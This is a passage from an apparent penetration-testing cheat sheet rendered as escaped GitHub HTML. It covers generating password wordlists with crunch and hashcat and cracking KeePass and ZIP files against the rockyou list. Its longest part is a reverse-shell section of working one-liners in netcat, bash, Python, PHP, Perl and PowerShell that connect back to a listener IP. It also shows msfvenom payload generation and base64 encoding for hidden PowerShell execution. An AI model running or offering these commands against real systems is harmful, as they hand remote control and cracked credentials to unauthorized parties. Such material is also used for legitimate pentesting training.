class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e           E.g. -t p@ssword%! -l p@sswordx! : makes @ a literal, % still placeholder\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -o FILE : write output to file\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -f : Specifies a character set from the charset.lst file\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -s WORD : start at word\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -e WORD : end at word\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -p CHARSET / WORD WORD... : permute from charset/words (no repeats), MUST BE LAST OPTION\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -q FILE : like '-p', but takes chars/words from file\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Charset Placeholders for '-t':\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e   @ : 1st, or lowercase\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e   , : 2nd, or uppercase\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e   % : 3rd, or digits\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e   ^ : 4th, or symbols\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Tip: if you don't want to count the characters in '-t' pattern, \u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e just put 1 for min and max lenght. It will tell you how long \u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e your pattern is when it errors out\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e#  Examples  =====================================================\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e all possible 4 to 6 digit numeric PIN codes\u003c/span\u003e\ncrunch 4 6 0123456789\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e matching template \"Secret###!\"\u003c/span\u003e\ncrunch 10 10 -t \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eSecret%%%!\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -o wordlist.txt\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e every number between 1950 and 2050 (useful for years)\u003c/span\u003e\ncrunch 4 4 -t %%%% -s 1950 -e 2050\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e seasonal passwords (e.g. Summer2020!)\u003c/span\u003e\ncrunch 6 6 \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e@!#$\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -t s%%%%@ -p Spring Summer Autumn Fall Winter\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003e\u003ccode\u003ehashcat\u003c/code\u003e\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# create wordlist for all passwords starting with \u0026quot;Summer\u0026quot; and ending in 2-4 digits\n# '--increment-min' specifies min length to start mask bruteforce\nhashcat --stdout -a 3 --increment --increment-min 2 \u0026quot;Summer?d?d?d?d\u0026quot; \u0026gt; wordlist\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create wordlist for all passwords starting with \"Summer\" and ending in 2-4 digits\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '--increment-min' specifies min length to start mask bruteforce\u003c/span\u003e\nhashcat --stdout -a 3 --increment --increment-min 2 \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSummer?d?d?d?d\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e wordlist\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.2.5 Password Cracking Examples\u003c/h3\u003e\u003ca id=\"user-content-325-password-cracking-examples\" class=\"anchor\" aria-label=\"Permalink: 3.2.5 Password Cracking Examples\" href=\"#325-password-cracking-examples\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eKeePass databases (\u003ccode\u003e*.kdbx\u003c/code\u003e):\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# convert to friendly format\nkeepass2john Database.kdbx | tee keepass.hash\n\n# remove \u0026quot;Database:\u0026quot; from beginning\nvim keepass.hash\n\n# crack with rockyou + rules\nhashcat -m 13400 -a0 -w3 -O --force -r /usr/share/hashcat/rules/rockyou-30000.rule keepass.hash /usr/share/wordlists/rockyou.txt\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e convert to friendly format\u003c/span\u003e\nkeepass2john Database.kdbx \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tee keepass.hash\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e remove \"Database:\" from beginning\u003c/span\u003e\nvim keepass.hash\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e crack with rockyou + rules\u003c/span\u003e\nhashcat -m 13400 -a0 -w3 -O --force -r /usr/share/hashcat/rules/rockyou-30000.rule keepass.hash /usr/share/wordlists/rockyou.txt\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eZIP files:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# using fcrackzip\nfcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip\n\n# using john\nzip2john myfile.zip | tee zipkey.john\njohn zipkey.john --wordlist=/usr/share/wordlists/rockyou.txt\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using fcrackzip\u003c/span\u003e\nfcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace.zip\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using john\u003c/span\u003e\nzip2john myfile.zip \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tee zipkey.john\njohn zipkey.john --wordlist=/usr/share/wordlists/rockyou.txt\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.3 Reverse Shells\u003c/h2\u003e\u003ca id=\"user-content-33-reverse-shells\" class=\"anchor\" aria-label=\"Permalink: 3.3 Reverse Shells\" href=\"#33-reverse-shells\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\" rel=\"nofollow\"\u003ePentest Monkey Cheatsheet\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.revshells.com/\" rel=\"nofollow\"\u003eReverse Shell Generator\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eAlways start your \u003cstrong\u003eNetcat Listener\u003c/strong\u003e first!\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"nc -vlnp LISTEN_PORT\n# on mac, exclude the \u0026quot;-p\u0026quot; flag\"\u003e\u003cpre\u003enc -vlnp LISTEN_PORT\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on mac, exclude the \"-p\" flag\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNetcat Reverse Shell\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# if netcat has the -e flag:\nnc -e /bin/sh LISTEN_IP 443\n# can generate with msfvenom:\nmsfvenom -p cmd/unix/reverse_netcat_gaping -f raw lport=443 lhost=tun0\n\n# if no -e flag:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc LISTEN_IP 443 \u0026gt;/tmp/f\n# can generate with msfvenom:\nmsfvenom -p cmd/unix/reverse_netcat -f raw lport=443 lhost=tun0\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if netcat has the -e flag:\u003c/span\u003e\nnc -e /bin/sh LISTEN_IP 443\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can generate with msfvenom:\u003c/span\u003e\nmsfvenom -p cmd/unix/reverse_netcat_gaping -f raw lport=443 lhost=tun0\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if no -e flag:\u003c/span\u003e\nrm /tmp/f\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003emkfifo /tmp/f\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003ecat /tmp/f\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e/bin/sh -i \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u0026amp;1\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003enc LISTEN_IP 443 \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e/tmp/f\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can generate with msfvenom:\u003c/span\u003e\nmsfvenom -p cmd/unix/reverse_netcat -f raw lport=443 lhost=tun0\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eBash Reverse Shell\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# only works on Linux with bash\n/bin/bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/LISTEN_IP/443 0\u0026gt;\u0026amp;1'\n\n# can generate with msfvenom:\nmsfvenom -p cmd/unix/reverse_bash -f raw lport=443 lhost=tun0\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e only works on Linux with bash\u003c/span\u003e\n/bin/bash -c \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ebash -i \u0026gt;\u0026amp; /dev/tcp/LISTEN_IP/443 0\u0026gt;\u0026amp;1\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can generate with msfvenom:\u003c/span\u003e\nmsfvenom -p cmd/unix/reverse_bash -f raw lport=443 lhost=tun0\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePython Reverse Shell\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"python -c 'import os,socket,pty;s=socket.create_connection((\u0026quot;LISTEN_IP\u0026quot;,443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\n\n# daemonizing shell for *nix hosts\npython -c 'import os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection((\u0026quot;LISTEN_IP\u0026quot;,443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\n\n# can generate with msfvenom:\nmsfvenom -p cmd/unix/reverse_python -f raw lport=443 lhost=tun0\"\u003e\u003cpre\u003epython -c \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eimport os,socket,pty;s=socket.create_connection((\"LISTEN_IP\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e daemonizing shell for *nix hosts\u003c/span\u003e\npython -c \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eimport os,sys,socket,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection((\"LISTEN_IP\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can generate with msfvenom:\u003c/span\u003e\nmsfvenom -p cmd/unix/reverse_python -f raw lport=443 lhost=tun0\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePHP Reverse Shell\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# may have to try different socket numbers besides 3 (4,5,6...)\nphp -r '$sock=fsockopen(\u0026quot;LISTEN_IP\u0026quot;,443);exec(\u0026quot;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026quot;);'\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e may have to try different socket numbers besides 3 (4,5,6...)\u003c/span\u003e\nphp -r \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e$sock=fsockopen(\"LISTEN_IP\",443);exec(\"/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\");\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePerl Reverse Shell\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"perl -e 'use Socket;$i=\u0026quot;LISTEN_IP\u0026quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026quot;tcp\u0026quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026quot;\u0026gt;\u0026amp;S\u0026quot;);open(STDOUT,\u0026quot;\u0026gt;\u0026amp;S\u0026quot;);open(STDERR,\u0026quot;\u0026gt;\u0026amp;S\u0026quot;);exec(\u0026quot;/bin/sh -i\u0026quot;);};'\n\n# can generate with msfvenom:\nmsfvenom -p cmd/unix/reverse_perl -f raw lport=443 lhost=tun0\"\u003e\u003cpre\u003eperl -e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003euse Socket;$i=\"LISTEN_IP\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u0026gt;\u0026amp;S\");open(STDOUT,\"\u0026gt;\u0026amp;S\");open(STDERR,\"\u0026gt;\u0026amp;S\");exec(\"/bin/sh -i\");};\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can generate with msfvenom:\u003c/span\u003e\nmsfvenom -p cmd/unix/reverse_perl -f raw lport=443 lhost=tun0\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003ePowershell Reverse Shell\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eInvoke from \u003ccode\u003ecmd\u003c/code\u003e with \u003ccode\u003epowershell -NoP -NonI -W Hidden -Exec Bypass -Command ...\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"$client = New-Object System.Net.Sockets.TCPClient(\u0026quot;LISTEN_IP\u0026quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2  = $sendback + \u0026quot;PS \u0026quot; + (pwd).Path + \u0026quot;\u0026gt; \u0026quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\u003e\u003cpre\u003e\u003cspan class=\"pl-smi\"\u003e$client\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e System.Net.Sockets.TCPClient(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eLISTEN_IP\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e443\u003c/span\u003e);\u003cspan class=\"pl-smi\"\u003e$stream\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$client\u003cspan class=\"pl-smi\"\u003e.GetStream\u003c/span\u003e\u003c/span\u003e();[\u003cspan class=\"pl-k\"\u003ebyte\u003c/span\u003e[]]\u003cspan class=\"pl-smi\"\u003e$bytes\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e..\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e65535\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e%\u003c/span\u003e{\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e};\u003cspan class=\"pl-k\"\u003ewhile\u003c/span\u003e((\u003cspan class=\"pl-smi\"\u003e$i\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$stream\u003cspan class=\"pl-smi\"\u003e.Read\u003c/span\u003e\u003c/span\u003e(\u003cspan class=\"pl-smi\"\u003e$bytes\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$bytes\u003cspan class=\"pl-smi\"\u003e.Length\u003c/span\u003e\u003c/span\u003e)) \u003cspan class=\"pl-k\"\u003e-ne\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e){;\u003cspan class=\"pl-smi\"\u003e$data\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e (\u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eTypeName System.Text.ASCIIEncoding).GetString(\u003cspan class=\"pl-smi\"\u003e$bytes\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$i\u003c/span\u003e);\u003cspan class=\"pl-smi\"\u003e$sendback\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e (iex \u003cspan class=\"pl-smi\"\u003e$data\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u0026amp;1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eOut-String\u003c/span\u003e );\u003cspan class=\"pl-smi\"\u003e$sendback2\u003c/span\u003e  \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$sendback\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ePS \u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e (pwd).Path \u003cspan class=\"pl-k\"\u003e+\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u0026gt; \u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e;\u003cspan class=\"pl-smi\"\u003e$sendbyte\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e=\u003c/span\u003e ([\u003cspan class=\"pl-k\"\u003etext.encoding\u003c/span\u003e]::ASCII).GetBytes(\u003cspan class=\"pl-smi\"\u003e$sendback2\u003c/span\u003e);\u003cspan class=\"pl-smi\"\u003e$stream\u003cspan class=\"pl-smi\"\u003e.Write\u003c/span\u003e\u003c/span\u003e(\u003cspan class=\"pl-smi\"\u003e$sendbyte\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$sendbyte\u003cspan class=\"pl-smi\"\u003e.Length\u003c/span\u003e\u003c/span\u003e);\u003cspan class=\"pl-smi\"\u003e$stream\u003cspan class=\"pl-smi\"\u003e.Flush\u003c/span\u003e\u003c/span\u003e()};\u003cspan class=\"pl-smi\"\u003e$client\u003cspan class=\"pl-smi\"\u003e.Close\u003c/span\u003e\u003c/span\u003e()\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAlternatively, you can create a PowerShell reverse shell with msfvenom:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"msfvenom -p cmd/windows/powershell_reverse_tcp -f raw -o derp.ps1 lport=443 lhost=tun0\"\u003e\u003cpre\u003emsfvenom -p cmd/windows/powershell_reverse_tcp -f raw -o derp.ps1 lport=443 lhost=tun0\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf you convert to base64 on Linux for execution with \u003ccode\u003epowershell -enc \"BASE64ENCODEDCMD\"\u003c/code\u003e, use the following command to ensure you don't mess up the UTF-16LE encoding that Windows uses:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# base64-encoding custom powershell 1-liner\necho '$client = New-Object System.Net.Sockets.TCPClient(\u0026quot;LISTEN_IP\u0026quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2  = $sendback + \u0026quot;PS \u0026quot; + (pwd).Path + \u0026quot;\u0026gt; \u0026quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 | tr -d '\\n'; echo\n\n# msfvenom version\nmsfvenom -p cmd/windows/powershell_reverse_tcp -f raw lport=443 lhost=tun0 | iconv -t UTF-16LE | base64 | tr -d '\\n'; echo\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e base64-encoding custom powershell 1-liner\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e$client = New-Object System.Net.Sockets.TCPClient(\"LISTEN_IP\",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"\u0026gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e iconv -t UTF-16LE \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e base64 \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tr -d \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\\n\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e msfvenom version\u003c/span\u003e\nmsfvenom -p 